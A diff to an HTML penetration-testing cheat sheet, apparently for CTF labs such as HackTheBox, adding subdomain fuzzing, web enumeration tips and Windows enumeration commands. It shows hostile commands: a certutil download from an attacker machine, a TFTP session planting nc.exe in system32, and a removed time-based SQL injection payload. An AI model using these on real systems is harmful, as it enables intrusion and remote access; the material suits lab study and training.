@@ -77,7 +77,15 @@ nmap -sU -sV -Pn -T4 -vv -D [FAKE_IP_ADDRESS] [TARGET]     (UDP Decoy)
 nmap -Pn -sV -A -pT:{TCP ports found in step 1},U:{UDP ports found in step 1} -script vuln [IP_ADDRESS]
 </pre>
 <hr>
+<hr>
+<p><h3>Subdomain fuzzing:</h3></p>
+<pre style="background-color:black;color:white;">
+wfuzz -w cewl_output -u streetfighterclub.htb -H "Host: FUZZ.streetfighterclub.htb"
+#if host is not resolved, add the name to /etc/hosts file.
+</pre>
 <p><h3>Any web port(s) for further enumeration?</h3></p>
+<p><font size="3.5" color="black">"Cewl" the target and "Gobust" using the output wordlist.</font></p>
+<p><font size="3.5" color="black">"Nikto" the target.</font></p>
 <p><font size="3.5" color="black">Fuzz directories (HTTP/HTTPS) using ZAP  (/usr/share/secLists/Discovery folder that has some great wordlists for this)</font></p>
 <hr>
 <p><h3>Manual Poking for Web Pages</h3></p>
@@ -103,7 +111,7 @@ wpscan --url [URL] --enumerate u	(Enum users)
 <p><font size="3.5" color="black">* Boolean Blind SQL Injection - https://www.youtube.com/watch?v=4LM_EIehbsU</font></p>
 <p><font size="3.5" color="black">* Time Based SQL Injection - https://www.youtube.com/watch?v=mphLv1ZCMf8 </font></p>
 <p><font size="3.5" color="black">* Error Based + upload shell https://www.youtube.com/watch?v=vPgMi7R9tvs  /  https://www.youtube.com/watch?v=0xrDZi8Qq0A</font></p>
-<p><font size="3.5" color="black">* /*/bWAPP/sqli_5.php?title=The+Dark+Knight+Rises'-if(length(database())%3d'5',sleep(5),1)%23&action=go</font></p>
+<p><font size="3.5" color="black">* From MSSQL to RCE - https://www.tarlogic.com/en/blog/red-team-tales-0x01/</font></p>
 
 <p><font size="3.5" color="black">Cheat Sheets:</font></p>
 <p><font size="3.5" color="black">* https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/</font></p>
@@ -373,10 +381,28 @@ certutil -urlcache -split -f http://[ATTACKERS_MACHINE]/[FILE_TO_TRANSFER] C:\\u
 <p><font size="3.5" color="black">Windows:</font></p>
 <p><font size="3.5" color="black">- http://www.bhafsec.com/wiki/index.php/Windows_Privilege_Escalation</font></p>
 <p><font size="3.5" color="black">- http://www.fuzzysecurity.com/tutorials/16.html</font></p>
+<p><font size="3.5" color="black">- ADS - https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/</font></p>
+<p><font size="3.5" color="black">Basic enumeration:</font></p>
+<pre style="background-color:black;color:white;">
+whoami /priv	#user's privileges on the system
+sc query state= all type= all | findstr SERVICE_NAME	#enumerate services and drivers
+</pre>
 <p><font size="3.5" color="black">Search for license.rtf / eula.txt:</font></p>
 <pre style="background-color:black;color:white;">
 C:\windows\system32\license.rtf #on tftp win xp - "get \windows\system32\license.rtf"
 C:\windows\system32\eula.txt	#on tftp win xp - "get \windows\system32\eula.txt"
+</pre>
+<p><font size="3.5" color="black">Transferring files TFTP example:</font></p>
+<pre style="background-color:black;color:white;">
+root@gandosha:~/Desktop/CTFs/Dropzone# tftp [IP_ADDRESS]
+tftp> status
+Connected to [IP_ADDRESS].
+Mode: netascii Verbose: off Tracing: off
+Rexmt-interval: 5 seconds, Max-timeout: 25 seconds
+tftp> mode binary
+tftp> put nc.exe /windows/system32/nc.exe
+Sent 59392 bytes in 13.4 seconds
+tftp> quit
 </pre>
 <p><font size="3.5" color="black">AppLocker policy: (on meterpreter's powershell module it works better)</font></p>
 <pre style="background-color:black;color:white;">
